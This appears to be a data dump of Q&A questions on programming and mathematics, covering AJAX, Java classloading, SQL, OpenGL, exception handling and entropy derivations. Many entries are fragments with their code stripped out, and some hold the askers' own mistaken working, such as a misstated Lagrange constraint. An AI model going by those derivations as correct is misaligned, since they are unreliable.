I have a wrapper div in my page that goes from right underneath the top body tag to right above my footer. After the form is submitted and the results are returned via AJAX, I replace the contents of this wrapper div with the results. The results are all contained within one big table. However, for some reason, after I submit the form and the results come back, all of the s in the whole table are all 4 pixels longer vertically. The s have their lengths specified in the code, so they are all the correct length still, but the extends 4 pixels longer underneath. When I look at the results directly from the backend PHP page, everything looks fine and the s are all the correct length. Because everything is fine with the results before they're sent back to the first page, I'm not sure what the problem is. I can't figure out what is causing this to happen, any advice on what is causing it and/or how to fix it would be helpful!","['&lt;tr&gt;', '&lt;td&gt;', '&lt;tr&gt;', '&lt;tr&gt;']",False

Now I've coded this algorithm. I would like to improve it and find little mistakes which could be in it. I don't want to discuss how to solve it - as we did in the last question. Now I only want to improve it. Can you help me again please? Are there any mistakes? Is the structure of the nested if-clauses ok? Could it be improved?

2262967,"At runtime, find all classes in a Java application that extend a base class","I want to do something like this: So, I want to look at all of the classes in my application's universe, and when I find one that descends from Animal, I want to create a new object of that type and add it to the list. This allows me to add functionality without having to update a list of things. I can avoid the following: With the above approach, I can simply create a new class that extends Animal and it'll get picked up automatically. UPDATE: 10/16/2008 9:00 a.m. Pacific Standard Time: This question has generated a lot of great responses -- thank you. From the responses and my research, I've found that what I really want to do is just not possible under Java. There are approaches, such as ddimitrov's ServiceLoader mechanism that can work -- but they are very heavy for what I want, and I believe I simply move the problem from Java code to an external configuration file. Another way to state what I want: a static function in my Animal class finds and instantiates all classes that inherit from Animal -- without any further configuration/coding. If I have to configure, I might as well just instantiate them in the Animal class anyway. I understand that because a Java program is just a loose federation of .class files that that's just the way it is.

However the plugin in question uses some jar that the framework also uses but of a different version. The code is structured in a way where the code integrating in the framework (extending the plugin extension points) and the code doing the actual work is very well decoupled (basically boils down to an API of less than 10 classes). However behind these few classes is hidden a fairly big and complex system (60+ jar dependency) The question is as follows : How do I ensure that anything instantiated by the API classes is done using a seperate private library of jar files ? In other words, how to I isolate the plugin so that it runs with it's own private library without interfering with the main application's libraries ? ---- EDIT ---- Thus far the only two ways this could be accomplish is by embedding a framework such as OSGi or by providing my own implementation of a class loader. The latter can be done and many variants are proposed on the net though I found nothing that would give me the confidence of stability I need for the system at hand.

2416274,Is there a way to use javascript to determine if the current browser supports hiding <option> tags?,"Updated question: Is there a way to use javascript to feature sniff, rather than the evil, browser sniff, to determine if the current browser supports/doesn't support hiding tags? IE does not support hiding tags in the select element. So I'd like to write some code to adjust when the browser doesn't support hiding option tags. But I'd rather not write the code based on the browser being IE or not, but rather if the browser supports hiding or not. Anyone know a way? Older question: I wrote some jQuery code to .hide() an element in a select dropdown. .hide() is what I want, because later I can call .show() and the options will not need to be resorted, since the now visible option element will not have changed positions. .hide() worked great in FF/Chrome, but not in IE6/7/8. So my thought was to write more code after the hide which determined if the current browser was capable of hiding the element (rather than writing browser version sniffing code). IE reports that yes, the option element is hidden (even though it isn't). $('option.hideMe').hide(); var result = $('option.hideMe').is(':visible'); //result === false in IE, but it is still visible in the dropdown. Before I rewrite the code to either 1) browser sniff or 2) use a different method which includes sorting on all browsers, is there another way of determining this situation?

Regardless, what I am trying to do should be possible - I get a response stream and now I need to read the image data from it. Howerver Returns the error: This does not happen the first time through the code (when clientData.Position==0). The second time through it always is thrown (when clientData.Position==4096). count is _buffer.Length.

2634567,Proofs that expose a deeper structure,"The standard proof of the Chernoff bound (from the Randomized Algorithms textbook) uses the Markov inequality and moment generating functions, with a bit of a Taylor expansion thrown in. Nothing too difficult, but somewhat mechanical. But there are other Chernoff bound proofs that expose the deeper structure driving the result. For example, there's an information-theoretic version that goes via the method of types, exemplified by this paper of Impagliazzo and Kabanets, as well as this brief post by Sanjoy Dasgupta. These latter proofs are more ""intuitive"" in that they provides a generalization of the standard result, as well explaining where the funny terms in the exponent come from (it's a KL-divergence). What are good examples of such things ? To be more concrete, here are the rules: The statement should be reasonably well-known (the kind of thing that would be taught in some kind of graduate class) There should be a ""standard"" proof available in textbooks or standard reference material that is ""commonly"" taught There should be an alternate proof that is not so well known, is NOT commonly taught, and either proves a more general statement or links the statement to a deeper mathematical structure. I'll start off with two examples. The chernoff bound ""textbook"" proof: markov inequality, moment generating functions, Taylor expansion (MR) Uncommon and insightful proof: method of types, exponent of tail involving KL-divergence The Schwartz-Zippel Lemma ""textbook"" proof: base-case involving univariate polynomial. Induction on number of variables ""uncommon"" proof: geometric argument via Dana Moshkovitz (and Per Vognsen) One example per answer please. p.s I'm not necessarily implying that the uncommon proof should be taught: a direct proof is often easier for students.

At the moment I have a very simple application which just has a single sprite on screen and is moved around using the directional keys. The problem is every two seconds or so, the game stutters and the sprite appears to jump backwards and then back forwards very quickly. The sprite itself is a 55x33 bitmap, so isn't anything large, and the code in use is as follows. Hopefully this is enough to get the ball rolling on some ideas as to what may be the problem, if a video is required to see exactly how the stuttering looks I can put one together and upload it somewhere if need be. As you'll see in the code it does compensate for time lost between frames by making the movement greater should it happen, however that drop is happening very consistently time wise, which is leading me to believe I'm doing something wrong somewhere. I've tried on a few different machines but the problem persists across all of them, if anyone has any ideas or can see where it is I'm messing up it'd be greatly appreciated if you could point it out.

2814836,Configuring DataSources with IDEA IntelliJ Jetty Plugin (jetty-env.xml),"I'm trying to getting started with the IDEA IntelliJ Jetty Plugin. In our application we use a JNDI DataSource to access the actual database. For development therefore we generate a jetty-env.xml and include this in the WEB-INF directory during development deploys: I reconfigured the Jetty WebAppDeployer in jetty.xml that way, so it uses the org.mortbay.jetty.plus.webapp.EnvConfiguration which reads and processes the jetty-env.xml: Unfortunately this doesn't work with the IDEA Jetty plugin. The IDEA Jetty Plugin generates a context-config.xml and a subsequent war-exploded.xml which does not add the EnvConfiguration.

There should be 3 lanes on highway, in every lane there are cars with constant speed. On this highway, there is one agent, which has to drive through and not crash into any other car.

This image is from mentioned paper and shows the look of highway: My goal is to write only a simulator (and GUI), not logic of agent. Now, I would like to design an architecture of this simulator and this is where I need help. My idea, how the agent's API can look is: Agent (car) on highway should be a descendant of this class. In every step, simulator call function where is the agents logic. In this function, agent can call functions like: So, in every step, agent can decide if he stay in current lane, or if he turns left or right. And that’s all, what can agent do. So this is agents API, but I do not know, how to design the rest of simulator. My first attempt to simulator architecture was: This is not a good architecture. In which class should be methods , and ? Because these methods has to be inside of class, but has to know position of every car on highway.

From the documentation, it seems that convertView should be a view that was already created and has now been scrolled off the screen.

3299280,Selecting associated id's when only IN (values) and NOT IN (otherValues),"Sorry for the poor headline, I couldn't think of a better way to describe my problem, so I've made up for it by explaining it well with examples. Setup If you'd like to follow along, here's the SQL to create the table for my problem: This results in the following table: Scenario I have a ""group"" of Sections for which I must find all Students associated with a combination of Sections. My application will have several ""groups"" of Sections. For ""Group 1"" of section_id's: (11,12,13,14,15) Student 1 is associated with all Sections (11,12,13,14,15). Student 2 is associated with (12,13,14) but not (11,15). For ""Group 2"" of section_id's: (21,22,23,24,25) Student 2 is associated with (21,22,23) but not (24,25). Given section_id's (12,13,14) I need to select the student_id's associated with those section_id's, but not with section_id's (11,15). For example, if given section_id's (12,13,14) I want to select student_id (2). Even though student_id 1 is associated with section_id (12,13,14) she is also associated with 11 and 15, so I don't want her id returned. The higher purpose of this query is I will use it as a subquery to select lists of students given a combination of sections. Also for example, if given section_id's (12,13) no results would be returned. What I have tried I tried using a mix of IN and NOT IN, but because 5 rows have student_id 1 and 3 rows associated with (12,13,14) the DISTINT() in the following query returns both student_id 1 and 2. Update February 1 I added some additional use case data that slightly changed the requirements of the query.

3309494,Exception handling practices,"Anyway, I'm a little confused about when to propagate an exception and when to wrap it, and the differences. At the moment, my understanding tells me that wrapping an exception would involve taking an exception like DriveNotFound (in IO) and then wrap it with the general IOException. But with the concept of propagating an exception, is this only something that happens if I have an empty catch clause? So in an ASP.NET web app, it would propagate to global.asax. Or in the case of a recently deployed web app, an unhandled HTTPException gave a yellow screen of death and wrote a log to Windows Server (this is a web app I'm rewriting). So the exception happens in a method, it could be handled at the class level, displayed in the page, and then goes up to global.asax or Windows Server. Why exactly do I want to wrap an exception with a more generic one? The rule is to handle an exception with the most specific type (so DriveNotFound for obviously a drive not found). Also, how would I choose between wrapping and replacing an exception? Is the exception handling chain just the try and catch (or catches) clauses? I assume from the wording, yes. Finally, why and how would I want to let an exception propagate up the callstack? I did read the MS PandP guide on exception handling, but I guess the examples didn't engage me enough to fully understand everything. This question comes from Enterprise Library the ability to wrap/propagate an exception and etc. It's the propagating I'm not sure about, and the differences in replacing/wrapping an exception. Also, is it ok to insert complex error handling logic in a catch block (e.g. ifs/elses and things like that). Thanks",[],False

3384501,"Submitting values of ""jQuery Editable Invoice"" into a MySQL DB using PHP","I am using this fantastic example of a jQuery editable invoice as a template for creating dynamic invoices for my users. It's working quite well and I am successfully generating the items but I now need to save the values entered into the various text fields and enter them into the MySQL database.

Here is an example of my code that I am using to generate the items: I am thinking that I need to perhaps generate unique ID's for each invoice items text field, ie , etc, but that involves writing javascript which I know almost nothing about. Also I would still have to get PHP to loop through the ID's somehow until it reached the end...

Find the angle that the ball hits the line angle = cos(distance(b, c) / distance(a, b)) Find the angle to rotate the ball's direction (90 - angle)*2 Rotate Ball's direction and move it to it's new position ignoring distance traveled to hit the line for now, doesn't need to be exactly on the line Else if there is no intersection Move the ball to it's new position.

3493723,Is there a third-party service that would handle iOS push notifications for us?,"Handling iOS push notifications seems to be a lot of work on the server side. According to the documentation the application should resend the device token to the server each time it launches – with popular applications this can result in a pretty big number of hits on the server. If the notifications are only send once in a while, there is quite a gap between the “support” traffic required to keep the devices in touch and the actual notification traffic. Like if I have a popular app that users launch several times a day, I can easily get thousands of hits a day from the device token updates. Even if I only wanted to send one or two notifications a week to these devices, I still have to handle the update load.

3522316,Why do ASP Textboxes sometimes show different text values than what's on screen?,"I created a 'Remember me' option on an ASP site and the client said they also wanted it to show the login name in the user field even after they press 'logout'. It works as long as I don't ever use a different login name again. Once I assign the value to the text box in the code behind, even if I manually type a new value the old value is what is used. Example: I type a user/password (eg. User1), click 'Remember me' and login successfully. I log out and am redirected back to the login page. On the page_load event, it detects that there is a valid cookie with the user name stored (User1) and it reads the value and sets the text field. I change the login to something else (eg. User2) and it fails saying invalid user/password. Weird. I check the data and it is using the old text field (User1). I try another (eg. User3) and press login.

I am using a SQL Server account that has rights to connect via ODBC (ODBC needs to be used because Visio won't recognise the native connector, a well documented deficiency, and a trusted connection can't be used as I also have local admin rights and our company refuses to recognise local admins on cross machine connections). This is using the ODBC SQL Server type of connection. If I change the ODBC connection to use the native client type it allows me to select the stored procedures, unfortunately the views box is still not able to be selected. I connected with Access using the plain SQL Server type of ODBC to see what I would be able to link and it allows me to see all tables, views, including system tables and views, which tells me the sys_admin rights are being preserved through the ODBC connection. Am I missing something here? A number of searches on SO and Google have turned up nothing about why Visio can't see certain objects (disregarding security permissions as I have admin access), and being able to ""see"" them via Access has made me a bit more frustrated, as I would assume both products utilising an ODBC connection of the same type would encounter the same restrictions and functionality. How do I get Visio to let me use the ""Reverse Engineer"" functionality to put the views from the SQL Server into my Visio document? I've done this before with other servers in the past.",['sys_admin'],False

I like the idea of fetchObject, because it's one line of code to create this object and set member variables for me. I just don't want it to set variables I haven't defined in my class. EDIT: Well it seems like karim79 is right and the fetch or fetchObject won't work the way I want it to. I've added the following bit of code after I do the fetch to get the desired results. Obviously not the most elegant solution :/ I'm going to extend the PDOStatement class and add my own method fetchIntoObject or something like that and automatically do these unsets. Hopefully shouldn't be to much overhead, but I want to be able to easily fetch into an object with 1 line of code :) SUPER EDIT: Thanks to mamaar's comment I went back to the documentation again. I found what the problem is. http://us.php.net/manual/en/pdo.constants.php and scroll down to PDO::FETCH_CLASS and it explains that the magic method __set() is used if properties don't exist in the class.

3632309,Creating a custom collection that can be bound to a DataGrid,"I work for an Architecture firm and I am creating a plug-in for a 3D modeling program to assist design. I have a Building class, and a Floor class. The building contains a reference to a FloorList collection of floors. I'm trying to figure out what to base the FloorList collection off of so that I can minimize the amount of work I need to do to create an interface to edit the collection. The Floor collection represents a series of building floors that are stacked on top of one another. Each Floor has a Floor.Height property that is read write, and an Floor.Elevation property that is read only and set by totaling the floor heights below the current Floor. So, whenever a Floor is added, removed, moved, or changed in the collection the Floor.Elevation properties need to be updated. In addition, I want to create a UI to edit this collection. I was thinking of using a DataGrid control where each Floor is listed with its Height and other properties as a row of the control. The user should be able to add, remove, and re order floors using the control. I'd like setting this up to be as easy and flexible as possible. Meaning I'd like to simply be able to bind the collection of Floors to the DataGrid and have the columns of the DataGrid populate based on the properties of the Floor class. If possible I'd like to be able to utilize the built in Add/Remove UI interface of the DataGrid control with out having to mess with setting up a bunch of event relationships between my collection and the DataGrid. To complicate things further in the future I'll need to be able to allow the user to dynamically add custom properties to the Floors that I'll want them to be able to see and edit in the DataGrid as well. I think I'd end up doing that by having Floor class implement IExtenderProvider. So ultimately the DataGrid would look something like this: My question now is what should I base my FloorList collection off of to allow for this functionality? The options I'm considering are as follows. 1) Inherit from List(Floor) Methods such as Add/Remove are not vitrual and thus I can't not override them to update the elevations 2) Implement IList(Floor) OnChange event is not built in so if the lists changes the DataGrid will not update (I think?) I think this is probably the best option but what would I need to do the ensure that changes to the FloorList collection or DataGrid are synced with one another? 3) Inherit from BindingList(Floor) Method like Add/Remove are not virtual so I can't modify them to update the floor elevations. 4) Implement IBindingList IBindinglist is not generic and I only want my collection to contain Floor objects","[""\nInitial Properties      Future Custom User Properties\n\nHeight    Elevation     ProgramType    UnitType  UnitCount  \n15'       70'           Residential    Luxury    5\n15'       55'           Residential    Luxury    5\n15'       40'           Residential    Budget    10\n20'       20'           Retail         N/A       2\n20'       0'            Retail         N/A       3\n""]",False

3676562,Live timer using MySQL (& php),"Basically, I have a table called event: id | title | countdown | description | active | expired | created_at | updated_at I was starting to concept how to create ""LIVE"" events using MySQL or PHP. So I was thinking I could use either a Cron referencing PHP or an event using straight SQL. So my ideas were the following: Restructure my tables to: events: id | title | description | created_at | updated_at event_queue: id | event_id active_events: event_id | countdown | iteration expired_events: event_id | expired_at So having that, how can I create a live timer to run every second to update, at most, 100 rows in active_events every second? Example data to go inside active_events is as follows: event_id: 1, countdown: 20 (for 20 minutes), iteration: 90 I want to decrement countdown every second and when it hits 0, to decrement the iteration and start the countdown back to 20. Once the iteration is at 0 and countdown is at 0, just remove the entry completely, then archive the event to expired_events. Again, only a max of 100 rows will be inside active_events. What's the best way to go about doing this? Basically this is an internal application that people can vote on in the office and if no votes are done, then it goes away. The above structures are how I want it and see it working. Any thoughts? (I have to go to lunch and will update this or leave comments on any posts later) EDIT: Back from lunch!... I forgot to note that the countdown needs to reset every time an action is placed on it (a user votes on it). For the sake of my brain and thinking, lets say every time someone accepts one of the events, it is stored into accepted_events, and the active_events countdown has to be reset to 20.

3678539,Derivation of the maximum entropy distribution,"I am reading a book and having trouble following something. The problem is to try to maximize the differential entropy $-\int_{0}^{\infty}p(r)\log p(r)$ under the constraints that $\int_{0}^{\infty}p(r)=1$ and $\int_{0}^{\infty}rp(r)=\mu_{r}$. The book then just straightaway states that the result is an exponential distribution. I tried to prove this to myself but got stuck, it has been a while since I did any math so I am pretty sure I am missing something very basic. Here's how far I have gotten. I first wrote the lagrangian $L=-\int_{0}^{\infty}p(r)\log p(r)+\lambda_{1}\left(\int_{0}^{\infty}p(r)-1\right)+\lambda_{2}\left(\int_{0}^{\infty}rp(r)-\mu_{r}\right)\ \ \ \ \ \ \ \ (1)$ Now here is where I started getting a bit lost, I wasn't sure how to differentiate under the integral so I assumed that the integral was actually a sum over $p(r_{i})$ and differentiated $L$ w.r.t to $p(r_{i})$. Is this correct? What is the proper and general way to solve such differentials? Moving along, after differentiation (assuming it was a sum) I got the following $\frac{\partial L}{\partial p}=-\log p(r)-1+\lambda_{1}+\lambda_{2}r=0$ $\implies p(r)=e^{\lambda_{2}r+\lambda_{1}-1}\ \ \ \ \ \ \ \ (2)$ $\frac{\partial L}{\partial\lambda_{1}}=\int_{0}^{\infty}p(r)-1=0$ $\implies\int_{0}^{\infty}e^{\lambda_{2}r+\lambda_{1}-1}dr=1\ \ \ \ \ \ \ \ (3)$ $\frac{\partial L}{\partial\lambda_{2}}=\int_{0}^{\infty}rp(r)-1=0$ $\implies\int_{0}^{\infty}re^{\lambda_{2}r+\lambda_{1}-1}dr=1\ \ \ \ \ \ \ \ (4)$ But now as per my knowledge, the definite integrals in (3) and (4) should equal infinity, but that doesn't help me and so I am stuck? I am sure I am making some very basic conceptual mistake. Can someone please help me with this solution? Thanks.",[],False

3733178,How does CDI injection work in MDBs and @Scheduled beans?,"I'm working on a large Java EE 6 application that is deployed on JBoss 6 Final. My current tasks involve using @Inject consistently instead of @EJB, but I'm running into some problems on some types of beans, specifically @MessageDriven beans and beans with @Scheduled methods. What happens is that if I'm unlucky with the timing (for @Schedule) or if there are messages in the MDBs' queues at startup, instantiation of the beans will fail because the injected resources (which are EJBs themselves) are not bound yet. Because I use @Inject, I'm guessing that the EJB container considers my beans to be ready, since the container itself does not care about @Inject; it probably simply assumes that since there are no @EJB injections, the beans are ready for use. The injected CDI proxies will then fail because the resources to inject aren't actually bound yet. Tiny example: The above example will probably not fail often because there are only two beans, but the project I'm working on binds lots of EJBs, which will amplify the problem. But it might fail because there is no guarantee that MySupportingBean is bound first, and if onTimeout is invoked before MySupportingBean is bound, then instantiation of MyScheduledBean will fail. If I used @EJB instead, MyScheduledBean wouldn't be bound until the dependency to MySupportingBean was satisfied. Note that the example will not fail in onTimeout itself, but when CDI attempts to inject MySupportingBean. I've read a lot of posts on different forums where many people argue that @Inject is always better. Generally, I agree, but how do they handle @Schedule or @MessageDriven combined with @Inject? In my experience, it comes down to dumb luck whether the beans will work or not in those cases, and the beans will fail arbitrarily, depending on which order the EJBs are deployed in, and when @Schedule or onMessage are invoked.","['@Stateless\n@LocalBean\npublic class MySupportingBean {\n\n    public void doSomething() {\n        ...\n    }\n}\n\n@Singleton\npublic class MyScheduledBean {\n\n    @Inject\n    private MySupportingBean supportingBean;\n\n    @Schedule(second = ""*/1"", hour = ""*"", minute = ""*"", persistent = false)\n    public void onTimeout() {\n        supportingBean.doSomething();\n    }\n}\n']",False

The eye candy involves additive blending, accumulation, and trails and glow on the particles. At the moment I'm rendering by hand into a floating point image buffer, converting to unsigned chars at the last minute then uploading to an OpenGL texture. To simulate glow I'm rendering the same texture multiple times at different resolutions and different offsets. This is proving to be too slow, so I'm looking at changing something. The problem is, my dev hardware is an Intel GMA950, but the target machine has an Nvidia GeForce 8800, so it is difficult to profile OpenGL stuff at this stage. I did some very unsientific profiling and found that most of the slow down is coming from dealing with the float image: scaling all the pixels by a constant to fade them out, and converting the float image to unsigned chars and uploading to the graphics hardware. So, I'm looking at the following options for optimization: Replace floats with uint32's in a fixed point 16.16 configuration Optimize float operations using SSE2 assembly (image buffer is a 1024*768*3 array of floats) Use OpenGL Accumulation Buffer instead of float array Use OpenGL floating-point FBO's instead of float array Use OpenGL pixel/vertex shaders Have you any experience with any of these possibilities?

I thought off using @Before accompanied with getting current method via Thread.getCurrentThread() etc. but somehow I find this solution to be a little bit dirty, since I would have to make boiler plate code again within this method to fire reflection (and avoiding any unnecessary code was the goal in the first place).

I am loading textures with the following texture params: It appears to me that the sides of the 3D tiles are slightly being drawn, and you especially notice the artifact due to the lighting angle (directional) that is being applied from this angle. Are there any tricks or things I can check to eliminate this effect? I am rendering in ""layers"", but within those layers based on camera distance (furthest away first). All of these objects are in the same layer. Any ideas would be greatly appreciated! If useful, this is a project for iPhone/iPad using OpenGLES2.0. I'm happy to provide any code snippets - just let me know what might be a good place to start. UPDATE WITH VERTEX/PIXEL SHADER &amp; MODEL VERTICES Presently, I am using PowerVR's POD format to store model data exported from Blender (via Collada then Collada2Pod converter by PowerVR). Here's the GL_SHORT vertex coords (model space): 64 -64 32 64 64 32 -64 64 32 -64 -64 32 64 -64 -32 -64 -64 -32 -64 64 -32 64 64 -32 64 -64 32 64 -64 -32 64 64 -32 64 64 32 64 64 32 64 64 -32 -64 64 -32 -64 64 32 -64 64 32 -64 64 -32 -64 -64 -32 -64 -64 32 64 -64 -32 64 -64 32 -64 -64 32 -64 -64 -32 So everything should be perfectly flush, I would expect.

4226961,I don't know how the assignment operator works [processing],"I'm writing a program that simulates a snake, and the values of each section of the snake are stored in an array. In order to simulate the snake physics, I need to assign the subsequent section to the previous one, which is where I run into a problem. In this example, shouldn't foo output bar's previous mouse position? Bar is being assigned to mouseX after foo is being assigned to bar. Does the assignment operator make it so that if the variable that is assigned changes the variable being assigned to changes with it? This is very frustrating and I think the solution should be simple. How do I assign one variable to another disregarding future changes to the var being referenced?

We are developing server side too, so we are considering to use EventSource ( http://dev.w3.org/html5/eventsource ) and wrapper for android ( https://github.com/nkijak/EventSource/blob/master/src/com/kinnack/EventSource.java ), but maybe someone have better solution?

As you can see (hopefully), the darkest parts of the image have gone to a solid black. There is some texture there that I would like to keep; not much, but some, and I would like to bring it out in the final image. This is already a fairly aggressive rendering of the source file; here is a literal interpretation of the raw file, with autolevels turned off. For reference, here is the .NEF itself. I am assuming that one does this with the levels or curves tools. Here is a screenshot of the Bibble levels &amp; curves settings for the first image (note that it is also converted to B&amp;W using the iNDA plugin). I have tried adding additional control points to the curve but quickly became confused as to the mapping between input and output intensity. Perhaps untangling this confusion is the key?",[],False

I also want to implement a Windows application, purely for intranet usage, which will allow users to maintain various aspects of the ASP.NET user database (it has additional tables and fields beyond the stock schema). My initial thoughts are that I could do this by having various actions in my controller classes, into which I could pass a dedicated username/password and then within each action method validate those credentials using Membership.ValidateUser() . I realise I could use mixed-mode authentication with Windows authentication for the intranet part but this seems to me like a lot of unnecessary faffing since the intranet users won't be using a browser to do this. The Windows application will running on the corporate intranet and will be accessing those MVC 3 actions on the website via internal HTTP requests using this dedicated username/password in the query string.

4565737,openssl encryption and decryption using evp library,I have a plain text and I have the cipher text with me and my task is to find the key for the cipher text declared. The key is a word list like a dictionary. I have written the code in c and it compiles perfect and creates the file with all the ciphers. The problem I am facing is that every time i run the code a cipher text is completely different. I have no clue where I am making a mistake. The following is the code I had written 16 bytes and from my research on openssl it was said that there will be a pkcs#5 padding if the block length is does not fit into 16bytes. Is it the same case for the key also. The cipher text I declared does not match with the cipher text I am generating from the program and I am unable to find the key for the cipher text.

My understanding is that if the user includes the header String.h and String is in Utility then the programmer will want to use String. Obviously this could be bad if there are outside classes chain including a bunch of files which dirty up the namespace so I thought how about making it a #define instead.

4654365,Slow performance when storing handle objects in a cell array,"I have massive performance problems with just a very little portion of my MATLAB Code an hope you might have an idea how to improve it: I am developing an agent based simulation in MATLAB that creates lots of handle objects. Some of them are agents others can be e.g. objects that are owned by the agents. To clearly identify each of these handle object every single one gets a unique Id (obj.Id) that is issued by an ""IdDistributor"" object. The IdDistributor itself is handed over to the constructor of each object that is to resive an Id and is called from there to give out an Id-number (giveId). In addition the IdDistributor keeps a sort of phone book (an IdRegistry) that associates each Id with the object. So given the Id one can look up the object in the IdRegistry. I implemented this by using a cell array that stores the different handle objects in exactly that field that matches their Id. (Normal array does not work since the objects are of different classes). Testing my simulation it is really slow and the MATLAB Profiler shows that 99% of the time is spent with the IdDistributor especially with the line that stores the objects in the IdRegistry (It took something like 1 seconds per object when I tried to create about 10,000 objects). Now I'm trying to come to a similar solution that takes less time. As you can see in the code below I have already tried to increase Speed with pre-allocation (I extend the IdRegistry by 10,000 cells when it is full, instead of sizing up 1 by 1).I also thought about trying to somehow get the MATLAB internal Id of the handle objects but didn't follow that road when I read that that Id is not permanent and can be changed by the system. I would really much appreciate any ideas either how to speed up the code or to find a workaround/improvement to my concept!

4868679,rails ajax post works inconsistently,"OK, this one is driving me crazy. First of all, everything works fine in my development environment. In production, however, the behavior is inconsistent across multiple browsers. Sometimes it works, sometimes it doesn't. I'm using Rails 3.1 and jQuery 1.8.2. I had been using jQuery 1.4.1 and it wasn't working then, either. Here's what should happen: the user clicks a ""Save"" button and the client sends JSON-formatted data to rails which uses it to create several new ""response"" items and then redirects the user to the controller ""show"" action (the user answers the poll and then sees the results for all users). Here is the relevant code from my view (answer.html): The $('.save_button').click(function(event) fires every time. The ""error"" callback fires every time, too - but sometimes it works! Here is the relevant controller code: Sometimes the data are saved, new responses are created in my DB, and the page redirects to the show action. Other times, it just reloads the page. In these instances, it doesn't appear that the post data are reaching the server - I see nothing in production.log. I'm a complete beginner to ajax and only slightly more competent at Rails.

So when I'm looking at then is $(n!+1 , n+1)$ which I can make $(n!-n,n+1)$ by subtracting $n+1$ from $n!+1$ and since gcd is preserved in linear combinations I still get the same gcd for $(n!-n,n+1)$.

4974544,"Given a functor between categories, how to denote a morphism between particular objects of that category","I have a very common situation, for which I need both: (1) notation; and, if available, (2) a general relative term. Let's say that: there is a functor between categories, $f:C_1\to C_2$, $c_1$ is a particular object of $C_1$ $c_2$ is a particular object of $C_2$, such that in mapping $C_1$ to $C_2$, $f$ maps $c_1$ to $c_2$ What is the name given to a morphism that maps $c_1$ to $c_2$ in the same way that $f$ does, independently of the existence of $C_1$ or $C_2$? What concise notation can I use to refer to such a morphism? I am sure that there is a clear answer for this, but so that the point of my confusion is more clear, these are my intuitions about the issue: $f$ itself can't be the answer, because it is a specialization of the morphism that I am referring to, because it communicates a lot more information than just $c_1\to c_2$. For example, it is possible that another functor could map two completely different categories and still meet the criteria of mapping $c_1$ to $c_2$. (e.g. if $g: C_3 \to C_4$ could map $c_1$ to $c_2$ despite being distinct from $C_1$ and $C_2$) $f(c_1)$ seems closer to what I am looking for, but I think that $f(c_1)$ should actually refer to the resultant value, or $c_2$ itself. I am interested in the morphism between $c_1$ and $c_2$, rather than only $c_2$. Update: If my question seems nonsensical for reasons raised by both @Jim and @AlexKruckman, let's just consider $c_1$ and $c_2$ to be categories themselves and the morphism I am asking about to also be a functor itself.",[],False

Now, the views have images in them (hundreds each), and each view needs to have its own folder with images to refer to. How should this work?

5051411,Can I put Excel files in my web application under control of ASP.Net authorization?,"I am looking for a way to allow access to certain Excel files to specific users only. This is the scenario: I have an ASP.Net 4 application, which Forms authentication. I would like to be able to give access to ever growing sets of Excel files to a number of users. Each user is allowed access to one of the sets. I can easily arrange a navigation page, which will only show hyper-links to the Excel files the user is allowed to see. However, by guessing URL's, files from others could be retrieved as well. I tried the following scenario: Set up a base folder for all Excel files with inside it a folder for each user. In each folder, a web.config file is placed. On the main folder, this contains the following: Each subfolder this: This works well for any .aspx files inside the folders, but not for other types of resources, like my Excel files. Access to those is always granted. I assume that this is caused by the fact that these files are not handled by the ASP.Net worker process. What would be a good way to arrange access only to the correct user? I am thinking about storing the Excel files outside the ASP.Net application's virtual directory and writing some ServeExcel.aspx page that will output the Excel file using the Response stream. Are there better ways to do this? Addition, in response to the comment by BrOSs I read the 'Walkthrough: Creating a Web Site with Membership and User Login' and created a test site. In stead of following all steps, I did not start with an empty project template, but with a ASP.Net Web Application and caught up with the walk-through in step 'Creating the Members-Only Page'. I followed it up to and including step 'Adding New Users '. I created two users, user 'member', granted access to the folder Membership, and another user 'visitor', denied access to this folder. In addition to the steps in the tutorial, I added an Access rule 'Deny users'. When running the web application, the member page ~\MemberPages\Members.aspx is visible to 'member' and not to 'visitor'. After that, I put a file test.xls in the MemberPages folder. To my great surprise, access to this file is also denied to 'visitor' (and anonymous users)! Note added 2013-01-03: The true reason for the above to protect Excel files, is that I used the internal Visual Studio Development Server. On a server, IIS will be used and by default IIS itself will serve Excel files. I tried to modify the configuration of IIS 6.0 and 7.5 by modifying ISAPI filter configuration, but in the end this seemed to sensitive to misconfiguration, so I applied the solution suggested by Joe. This is a big difference from my experiences with my own web application and I have found a significant difference between the projects. My project does not use ASP.Net Membership, but uses a custom user table. Also, custom code is present in the global.asax.vb file: Note: the Person class implements the System.Security.Principal.IIdentity interface. I am not sure if similar code is executed in the test project, but at least nothing like it in the Global.asax.cs or Login.aspx.cs files. I attached the debugger to my project and found that Application_AuthenticateRequest is executed on each request for an aspx file, and every time, HttpContext.Current.User is nothing. During a request for an Excel file, this code is not executed and I assume this is why the file is served without any limitations imposed by the web.config authorization settings. I found another post: Object persistence (between post-backs) in ASP.NET and will delve into it and see of it can help me. Still, since the I am writing code that adds some custom functionality to a sort of framework ASP.Net application, used by many projects, I think changing the global.asax file will be outside acceptable modifications.

When I unlock the computer it fires both the locked and unlocked events :-( 2 - Using the task scheduler ""On workstation locked"" trigger Similar issue to above, but it also runs in a different context so doesn't work properly.

So if $U$ is closed then this leads to a contradiction. Conversely, if $U$ is open in $X$ and $f(U)=V$ is closed in $Y$, then $V^c$ is open; however, the complement of the pre-image $f{^-1}(V)$ is closed since $(f{^-1}(V))^c = U$ which is open; which again leads to a contradiction.

I have managed to check for schema changes with regard to dropped/added tables, columns, indexes, references but when it comes to renamed columns I'm a bit stuck. In the following example, the source database contains the most up to date schema and the destination database contains similar schema but is likely out of date. Prerequisites: I am not aware of changes which have occurred since the last diff. The data in the databases will not match, but the schema should after the diff. Take for example the following schema in the destination database. And then assume the following schema in the source database. Without knowing explicitly what occurred, I am unable to determine whether or not changed to by way of or . The following two queries achieve the same result in terms of table structure, but the data is lost using the former. I can obviously drop the old column name and create a new one but that then loses any data in the original column. I need to use an query rather than followed by I was hoping that I could use a DDL trigger to track changes in schema and insert a record of such changes into a table in the source database. I could later query this table to determine how a certain column came to be. However, as far as I can tell it's not possible to run triggers on DDL queries in MySQL which rules out logging these changes. I had a read of this worklog (WL#2418: DDL Triggers) on MySQL forge but it appears to be pending implementation still unfortunately. Is there a way in which I can update tables to match a schema with regard to renamed columns without data loss? I have looked at things like MySQLDiff but it needs to be built into an existing bit of code so I'm having to build it myself. Ideas I've Considered Add a comment to each column which is a unique number or string (call it a hash for the sake of argument). Query the information_schema table to retrieve this value and compare it on each columns. If it's unique then it's a new column, or if it matches a hash but not a name or structure then 